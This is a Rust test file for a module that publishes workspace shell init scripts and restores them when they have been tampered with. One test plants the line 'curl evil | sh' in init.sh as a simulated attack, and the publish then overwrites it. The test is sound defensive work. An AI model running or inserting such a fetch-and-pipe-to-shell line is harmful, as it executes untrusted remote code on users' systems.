// SPDX-License-Identifier: AGPL-3.0-or-later
use puddle_store::{Limits, ManualClock, ShellInitText};

use super::*;

fn copies(root: &Path) -> (Copies, Arc<Store>) {
    let store =
        Arc::new(Store::open_in_memory(Arc::new(ManualClock::new(1)), Limits::default()).unwrap());
    (Copies::new(root.to_path_buf(), Arc::clone(&store)), store)
}

fn id(text: &str) -> WorkspaceId {
    WorkspaceId::new(text).unwrap()
}

#[test]
fn the_constants_are_valid_guest_paths_and_the_loader_sources_the_mounted_file() {
    for path in [GUEST_DIR, LOADER_GUEST] {
        assert!(GuestPath::new(path).is_ok(), "{path}");
    }
    assert!(
        // flake-ok: a path inside the guest, which is Linux whatever the host is
        GuestPath::new(&format!("{GUEST_DIR}/{FILE_NAME}"))
            .unwrap()
            .is_within(&GuestPath::new(GUEST_DIR).unwrap())
    );
    let loader = loader();
    let text = String::from_utf8(loader.contents().to_vec()).unwrap();
    assert!(text.contains(". /puddle/shell-init/init.sh"), "{text}");
    assert_eq!(loader.path().as_str(), LOADER_GUEST);
}

#[test]
fn the_first_publish_makes_the_folder_and_an_empty_file_when_nothing_is_saved() {
    let dir = tempfile::tempdir().unwrap();
    let (copies, _) = copies(dir.path());
    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Clean);
    assert_eq!(
        fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
        ""
    );
    let mount = copies.mount(&id("w1"));
    assert_eq!(mount.guest.as_str(), GUEST_DIR);
    assert_eq!(mount.host, dir.path().join("w1"));
}

#[test]
fn a_saved_text_is_published_and_a_new_save_replaces_it_without_a_tamper_report() {
    let dir = tempfile::tempdir().unwrap();
    let (copies, store) = copies(dir.path());
    store
        .set_shell_init(&id("w1"), &ShellInitText::new("export A=1").unwrap())
        .unwrap();
    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Clean);
    assert_eq!(
        fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
        "export A=1\n"
    );
    // The user saved again: the file differs from the database before the next start's
    // publish only when someone else changed it, so a save publishes through the same call and
    // the next start finds nothing wrong.
    store
        .set_shell_init(&id("w1"), &ShellInitText::new("export A=2").unwrap())
        .unwrap();
    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Restored);
    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Clean);
}

#[test]
fn a_changed_file_extra_files_and_a_link_are_put_right_and_reported() {
    let dir = tempfile::tempdir().unwrap();
    let (copies, store) = copies(dir.path());
    store
        .set_shell_init(&id("w1"), &ShellInitText::new("export A=1").unwrap())
        .unwrap();
    copies.publish(&id("w1")).unwrap();
    let folder = dir.path().join("w1");

    fs::write(folder.join("init.sh"), "curl evil | sh\n").unwrap();
    fs::write(folder.join("extra.sh"), "x").unwrap();
    fs::create_dir_all(folder.join("sub/deeper")).unwrap();
    fs::write(folder.join("sub/deeper/f"), "x").unwrap();
    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Restored);
    assert_eq!(
        fs::read_to_string(folder.join("init.sh")).unwrap(),
        "export A=1\n"
    );
    let left: Vec<_> = fs::read_dir(&folder)
        .unwrap()
        .map(|e| e.unwrap().file_name())
        .collect();
    assert_eq!(left, ["init.sh"]);
}

#[cfg(unix)]
#[test]
fn a_link_in_the_folder_is_replaced_and_what_it_pointed_at_is_never_written() {
    let dir = tempfile::tempdir().unwrap();
    let (copies, store) = copies(dir.path());
    store
        .set_shell_init(&id("w1"), &ShellInitText::new("export A=1").unwrap())
        .unwrap();
    copies.publish(&id("w1")).unwrap();
    let folder = dir.path().join("w1");
    let precious = dir.path().join("precious");
    fs::write(&precious, "keep me").unwrap();

    fs::remove_file(folder.join("init.sh")).unwrap();
    std::os::unix::fs::symlink(&precious, folder.join("init.sh")).unwrap();
    // A link where the temporary file goes, too.
    std::os::unix::fs::symlink(&precious, folder.join(".init.sh.new")).unwrap();
    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Restored);
    assert_eq!(fs::read_to_string(&precious).unwrap(), "keep me");
    assert!(
        !fs::symlink_metadata(folder.join("init.sh"))
            .unwrap()
            .file_type()
            .is_symlink()
    );
    assert_eq!(
        fs::read_to_string(folder.join("init.sh")).unwrap(),
        "export A=1\n"
    );
}

#[test]
fn publishing_the_same_folder_from_many_threads_never_fails_and_the_last_save_wins() {
    let dir = tempfile::tempdir().unwrap();
    let (copies, store) = copies(dir.path());
    let copies = Arc::new(copies);
    // Bounded by time, not by rounds: each publish syncs a file, which takes milliseconds on
    // Windows. Without the lock, most 3-second runs on Linux fail.
    let until = std::time::Instant::now() + Duration::from_secs(3);
    let workers: Vec<_> = (0..8)
        .map(|worker| {
            let copies = Arc::clone(&copies);
            let store = Arc::clone(&store);
            std::thread::spawn(move || {
                let mut round = 0;
                while std::time::Instant::now() < until {
                    let text = ShellInitText::new(&format!("export A={worker}{round}")).unwrap();
                    store.set_shell_init(&id("w1"), &text).unwrap();
                    copies.publish(&id("w1")).unwrap();
                    round += 1;
                }
            })
        })
        .collect();
    for worker in workers {
        worker.join().unwrap();
    }
    assert_eq!(
        fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
        copies.saved(&id("w1")).unwrap().unwrap(),
    );
}

#[test]
fn forgetting_removes_the_folder_and_a_missing_one_is_fine() {
    let dir = tempfile::tempdir().unwrap();
    let (copies, _) = copies(dir.path());
    copies.publish(&id("w1")).unwrap();
    copies.forget(&id("w1"));
    assert!(!dir.path().join("w1").exists());
    copies.forget(&id("w1"));
}

#[test]
fn a_save_that_picked_the_workspace_before_its_delete_does_not_bring_the_folder_back() {
    let dir = tempfile::tempdir().unwrap();
    let (copies, store) = copies(dir.path());
    copies.publish(&id("w1")).unwrap();
    // The save event found the workspace, then the delete ran to its end.
    copies.forget(&id("w1"));
    copies.forget(&id("w1"));
    store
        .set_shell_init(&id("w1"), &ShellInitText::new("export A=1").unwrap())
        .unwrap();
    assert_eq!(copies.refresh(&id("w1")), Ok(Published::Clean));
    assert_eq!(copies.refresh(&id("w1")), Ok(Published::Clean));
    assert!(!dir.path().join("w1").exists());
}

#[test]
fn a_workspace_made_again_under_a_deleted_id_is_not_blocked_after_its_first_start() {
    let dir = tempfile::tempdir().unwrap();
    let (copies, store) = copies(dir.path());
    copies.publish(&id("w1")).unwrap();
    copies.forget(&id("w1"));
    store
        .set_shell_init(&id("w1"), &ShellInitText::new("export A=2").unwrap())
        .unwrap();
    copies.publish(&id("w1")).unwrap();
    assert_eq!(
        fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
        "export A=2\n"
    );
    store
        .set_shell_init(&id("w1"), &ShellInitText::new("export A=3").unwrap())
        .unwrap();
    copies.refresh(&id("w1")).unwrap();
    assert_eq!(
        fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
        "export A=3\n"
    );
}

#[test]
fn forgetting_a_folder_that_cannot_be_removed_leaves_it_and_goes_on() {
    let dir = tempfile::tempdir().unwrap();
    let (copies, _) = copies(dir.path());
    // Not a folder, so removing it as one fails with something other than "not found".
    let in_the_way = dir.path().join("w1");
    fs::write(&in_the_way, "x").unwrap();
    copies.forget(&id("w1"));
    assert!(in_the_way.exists());
}

#[test]
fn an_extra_file_beside_the_right_text_is_removed_and_reported() {
    let dir = tempfile::tempdir().unwrap();
    let (copies, store) = copies(dir.path());
    store
        .set_shell_init(&id("w1"), &ShellInitText::new("export A=1").unwrap())
        .unwrap();
    copies.publish(&id("w1")).unwrap();
    let extra = dir.path().join("w1/extra.sh");
    fs::write(&extra, "echo hi").unwrap();
    assert_eq!(copies.publish(&id("w1")).unwrap(), Published::Restored);
    assert!(!extra.exists());
    assert_eq!(
        fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
        "export A=1\n"
    );
}

#[test]
fn a_folder_that_cannot_be_written_says_which_workspace_and_why() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("in-the-way");
    fs::write(&file, "x").unwrap();
    // The root is a file, so no folder can be made below it.
    let (copies, _) = copies(&file);
    let why = copies.publish(&id("w1")).unwrap_err();
    assert!(why.contains("cannot write the shell init"), "{why}");
}

/// What a verdict says, as text to assert on: a refusal's message is in it.
fn refusal(said: &Result<Verdict, String>) -> String {
    format!("{said:?}")
}

#[test]
fn the_check_reads_every_exit_the_guest_script_has() {
    let said = |code: i32, out: &str| verdict(&ExecOutput::new(code, out, "err"));
    assert_eq!(said(0, ""), Ok(Verdict::Quiet));
    let syntax = refusal(&said(65, "line 3: unexpected end"));
    assert!(
        syntax.contains("does not parse") && syntax.contains("line 3"),
        "{syntax}"
    );
    let loud = refusal(&said(66, "hello"));
    assert!(
        loud.contains("prints output") && loud.contains("It printed: hello"),
        "{loud}"
    );
    let long = "y".repeat(10_000);
    let cut = refusal(&said(66, &long));
    assert!(cut.len() < 3000 && cut.contains(" ...\""), "{}", cut.len());
    assert!(said(70, "").unwrap_err().contains("could not run"));
    assert!(timed_out_message().contains("5 seconds"));
}

#[test]
fn the_check_request_runs_as_the_session_user_with_the_script_on_stdin_and_a_limit() {
    for user in [SessionUser::Agent, SessionUser::Root] {
        let request = check_request("echo hi\n", user);
        assert_eq!(request.stdin, b"echo hi\n");
        assert_eq!(request.user.as_deref(), Some(user.name()));
        assert_eq!(request.timeout, CHECK_TIMEOUT);
    }
}

#[test]
fn only_the_loader_counts_as_a_tampered_login_file() {
    assert!(loader_replaced(&["/etc/npmrc", LOADER_GUEST]));
    assert!(!loader_replaced(&["/etc/npmrc"]));
}

/// The guest script against a real shell: what it must catch and must let through.
#[cfg(unix)]
#[test]
fn the_guest_script_catches_a_syntax_error_and_output_and_passes_a_quiet_script() {
    let run = |script: &str| {
        let mut child = std::process::Command::new("sh")
            .args(["-c", CHECK_SCRIPT])
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .unwrap();
        puddle_test_kit::feed_stdin(&mut child, script.as_bytes());
        let out = child.wait_with_output().unwrap();
        ExecOutput::new(out.status.code().unwrap(), out.stdout, out.stderr)
    };
    let quiet = run("export A=1\nalias ll='ls -l'\nif false; then echo never; fi\n");
    assert_eq!(verdict(&quiet), Ok(Verdict::Quiet), "{quiet:?}");
    assert!(
        matches!(verdict(&run("if then\n")), Ok(Verdict::Refused(m)) if m.contains("does not parse"))
    );
    let loud = run("echo hello\n");
    assert!(matches!(verdict(&loud), Ok(Verdict::Refused(m)) if m.contains("It printed: hello")));
    // Output on stderr counts, and so does a bare newline.
    assert!(matches!(
        verdict(&run("echo oops >&2\n")),
        Ok(Verdict::Refused(_))
    ));
    assert!(matches!(verdict(&run("echo\n")), Ok(Verdict::Refused(_))));
}
